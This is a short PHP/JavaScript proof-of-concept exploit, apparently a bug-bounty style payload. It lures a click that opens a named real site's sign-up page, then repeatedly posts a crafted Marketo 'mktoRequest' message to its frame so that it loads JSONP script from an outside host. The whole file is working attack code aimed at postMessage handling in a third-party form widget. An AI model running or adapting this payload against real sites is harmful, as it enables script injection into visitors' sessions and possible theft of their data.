<?
header("Access-Control-Allow-Origin: *");
?>
(function(){
document.body.innerHTML='<a href="#" onclick="window.b=window.open(\'https://www.aq.academy/sign-up\',\'b\',\'\')">Click me!</a>'

setInterval(function() {
try {
	b['frames'][0].postMessage('{"mktoRequest":{"ajaxParams":{"url":"https://mrhavit.github.io/jsonp2.php","dataType":"jsonp","method":"get"}}}', '*')
} catch(e){}
}, 1000);
})()